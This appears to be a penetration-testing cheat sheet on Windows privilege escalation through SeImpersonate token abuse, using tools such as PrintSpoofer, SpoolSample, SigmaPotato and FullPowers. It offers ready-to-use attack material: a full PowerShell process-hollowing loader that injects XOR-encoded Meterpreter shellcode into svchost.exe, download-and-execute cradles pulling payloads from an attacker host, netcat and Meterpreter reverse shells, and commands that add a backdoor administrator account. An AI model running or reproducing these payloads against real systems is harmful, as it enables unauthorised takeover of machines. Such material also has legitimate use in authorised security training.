### **Access Tokens - SeImpersonate**

### **Impersonation with PrintSpoofer**

**Tokens that allow Elevation of Privileges**

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

**Requirements** This one work if :

- We have an User with `SeImpersonateAssigned` both assigned and enabled.
- We are in Windows 10 and Server 2016/2019.
- For older versions use other potatoes: [GitHub Reference](https://github.com/emmasolis1/OSCP/tree/main/04.privilege_escalation/windows/potatoes)

**Steps**

1. **(Optional)** Some steps to bypass UAC Controls like FodHelper could be needed.
2. **Check permissions**, see that `SeImpersonateAssigned` is both **assigned and enabled**

```powershell
whoami /priv

```

1. **Run the tool**, [GitHub Repo](https://github.com/itm4n/PrintSpoofer)

```powershell
PrintSpoofer.exe -i -c [COMMAND_TO_RUN]

# If you have a Meterpreter shell use either of these alternative modules
getsystem -t 5
getsystem -t 6

```

### **Impersonation with Incognito Meterpreter**

**Steps**

1. **Get a Meterpreter reverse shell**
2. **Load the module incognito**

```bash
meterpreter > load incognito

```

1. **Find the user you want to impersonate**

```bash
meterpreter > list_tokens -u

```

1. **Impersonate the user**

```bash
meterpreter > impersonate_token [USER]

```

1. **Verify impersonation**

```bash
meterpreter > getuid

```

### **Impersonation with PrintSpooler**

### **SpoolSample and SharpPrintSpoofer - Custom Command**

**Steps**

1. Find if the target is vulnerable

```powershell
# Check if we have SeImpersonate
whoami /priv

# Check the directory spools to see if we can trigger it
ls [LOCAL_SERVER]\pipe\spoolss
ls [TARGET_SERVER].com\pipe\spoolss

```

1. Put `SharpPrintSpoofer.exe` to listen, in this case it will be a command to add a new user but we could change this

```powershell
.\SharpPrintSpoofer.exe \\.\pipe\test\pipe\spoolss "net user amit Password123! /add"
.\SharpPrintSpoofer.exe \\.\pipe\test\pipe\spoolss "net localgroup administrators amit /add"

```

1. Once it is listening, trigger the pipe using `SpoolSample.exe` in other shell

```powershell
.\SpoolSample.exe [HOSTNAME] [HOSTNAME]/pipe/test

```

### **SpoolSample Modified - PS Rev Shell Loader**

SpoolSampleModified including already the functionality of `SharpPrintSpoofer.exe`, thus this one binary can handle the privilege escalation.

**Steps**

1. Craft your payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=443 -f csharp EXITFUNC=thread

```

1. XOR Encrypt your shellcode with key `0xfa`
2. Insert your encrypted shellcode below, and save the file as `hollow.ps1`

```powershell
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f csharp EXITFUNC=thread
# Shellcode should be XOR'd with key: 0xfa
[Byte[]] $SHELLCODE = 0x06,0xB2...

$key = 0xfa

# Decoding routine
for ($i = 0; $i -lt $SHELLCODE.Length; $i++) {
    $SHELLCODE[$i] = $SHELLCODE[$i] -bxor $key
}

filter Get-Type ([string]$dllName,[string]$typeName)
{
    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dllName) )
    {
        $_.GetType($typeName)
    }
}

function Get-Function
{
    Param(
        [string] $module,
        [string] $function
    )

    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )
    {
        throw "Error: GetModuleHandle and GetProcAddress must be initialized first!"
    }

    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))
    $GetProcAddress.Invoke($null, @($moduleHandle, $function))
}

function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}

# Obtain the required types via reflection
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'
$nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'
$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'
$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'

# Obtain the required functions via reflection: GetModuleHandle, GetProcAddress and CreateProcess
$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")

# Obtain the function addresses of the required hollowing functions
$ResumeThreadAddr = Get-Function "kernel32.dll" "ResumeThread"
$ReadProcessMemoryAddr = Get-Function "kernel32.dll" "ReadProcessMemory"
$WriteProcessMemoryAddr = Get-Function "kernel32.dll" "WriteProcessMemory"
$ZwQueryInformationProcessAddr = Get-Function "ntdll.dll" "ZwQueryInformationProcess"

# Create the delegate types to call the previously obtain function addresses
$ResumeThread = Get-Delegate $ResumeThreadAddr @([IntPtr])
$WriteProcessMemory = Get-Delegate $WriteProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr])
$ReadProcessMemory = Get-Delegate $ReadProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool])
$ZwQueryInformationProcess = Get-Delegate $ZwQueryInformationProcessAddr @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int])

# Instantiate the required structures for CreateProcess and use them to launch svchost.exe
$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
$processInformation = $processInformationType.GetConstructors().Invoke($null)

$cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))

# Obtain the required handles from the PROCESS_INFORMATION structure
$hThread = $processInformation.hThread
$hProcess = $processInformation.hProcess

# Create a buffer to hold the PROCESS_BASIC_INFORMATION structure and call ZwQueryInformationProcess
$processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)
$ZwQueryInformationProcess.Invoke($hProcess, 0, $processBasicInformation, $processBasicInformation.Length, 0)

# Locate the image base address. The address of the PEB is the second element within the PROCESS_BASIC_INFORMATION
# structure (e.g. offset 0x08 within the $processBasicInformation buffer on x64). Within the PEB, the base image
# addr is located at offset 0x10.
$imageBaseAddrPEB = ([IntPtr]::new([BitConverter]::ToUInt64($processBasicInformation, 0x08) + 0x10))

# Use ReadProcessMemory to read the required part of the PEB. We allocate already a buffer for 0x200
# bytes that we will use later on. From the PEB we actually only need 0x08 bytes, as $imageBaseAddrPEB
# already points to the correct memory location. We parse the obtained 0x08 bytes as Int64 and IntPtr.
$memoryBuffer = [System.Byte[]]::CreateInstance([System.Byte], 0x200)
$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPEB, $memoryBuffer, 0x08, 0)

$imageBaseAddr = [BitConverter]::ToInt64($memoryBuffer, 0)
$imageBaseAddrPointer = [IntPtr]::new($imageBaseAddr)

# Now that we have the base address, we can read the first 0x200 bytes to obtain the PE file format header.
# The offset of the PE header is at 0x3c within the PE file format header. Within the PE header, the relative
# entry point address can be found at an offset of 0x28. We combine this with the $imageBaseAddr and have finally
# found the non relative entry point address.
$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPointer, $memoryBuffer, $memoryBuffer.Length, 0)

$peOffset = [BitConverter]::ToUInt32($memoryBuffer, 0x3c)                               # PE header offset
$entryPointAddrRelative = [BitConverter]::ToUInt32($memoryBuffer, $peOffset + 0x28)     # Relative entrypoint
$entryPointAddr = [IntPtr]::new($imageBaseAddr + $entryPointAddrRelative)               # Absolute entrypoint

# Overwrite the entrypoint with shellcode and resume the thread.
$WriteProcessMemory.Invoke($hProcess, $entryPointAddr, $SHELLCODE, $SHELLCODE.Length, [IntPtr]::Zero)
$ResumeThread.Invoke($hThread)

# Close powershell to remove it as the parent of svchost.exe
exit

```

1. Start your HTTP Server

```bash
python3 -m http.server 80

```

1. Start your listener

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost [ATTACKER_IP]; set lport 443; exploit"

```

1. Transfer it to the victim and run it

```powershell
SpoolSampleModified.exe [HOSTNAME] [HOSTNAME]/pipe/test "C:\Windows\System32\cmd.exe /c powershell iex(iwr http://[ATTACKER_IP]/hollow.ps1 -useb)"

```

### **SigmaPotato .NET Reflection Memory Loading**

**Steps**

1. Start your HTTP Server

```bash
python3 -m http.server 80

```

1. Start your listener

```bash
nc -nvlp [PORT]

```

1. Load it and run it

```powershell
$WebClient = New-Object System.Net.WebClient

$DownloadData = $WebClient.DownloadData("http(s)://[ATTACKER_IP]/SigmaPotato.exe")
[System.Reflection.Assembly]::Load($DownloadData)

# Execute Command
[SigmaPotato]::Main("[COMMAND]")

# Establish a PowerShell Reverse Shell (one-liner)
[SigmaPotato]::Main(@("--revshell","[ATTACKER_IP","[PORT]"))

```

- [SigmaPotato GitHub Reference](https://github.com/tylerdotrar/SigmaPotato)

### **FullPowers**

Sometimes we get access to a machine with what seems to be a privilege service account but this account has almost non or very little permissions enabled, in this case we can use this tool, [`FullPowers.exe`](https://www.emmanuelsolis.com/resources/privilege_escalation/FullPowers.exe), to **automatically recover the default privilege set of a service account**, including the permissions `SeAssignPrimaryToken` and `SeImpersonate` which are very popular to escalate privileges.

1. Start the **Python Server**:

```bash
python3 -m http.server 80

```

![FullPowers](https://www.emmanuelsolis.com/img/fullpowers_1.png)

1. **Bring the Executable to the victim**:

```powershell
# CMD
cerutil.exe -urlcache -split -f http://[kali_ip]/FullPowers.exe

# PowerShell
iwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe

```

FullPowers Execution

![FullPowers Execution](https://www.emmanuelsolis.com/img/fullpowers_2.png)

1. Run the **Executable**:

```powershell
# Basic Usage
./FullPowers.exe

# Trying to get an extended set of privileges (might fail with NETWORK SERVICE)
./FullPowers.exe -x

# Specify a command line to run
./FullPowers.exe -c "powershell -ep Bypass"

# Start a reverse shell to the attacker machine (requires that you previously bring Netcat to the victim)
./FullPowers.exe -c "C:\Temp\nc64.exe [kali_ip] [port] -e cmd" -z

```

![FullPowers](https://www.emmanuelsolis.com/img/fullpowers_3.png)

1. **Verify** that you have now an elevated set of privileges:

```powershell
whoami /priv

```

![FullPowers](https://www.emmanuelsolis.com/img/fullpowers_4.png)

1. **Execute your Malicious Actions**: if you have now, for example, the permission `SeImpersonate` you could use `PrintSpoofer.exe` or `GodPotato.exe` to elevate your privileges.

![FullPowers](https://www.emmanuelsolis.com/img/fullpowers_5.png)
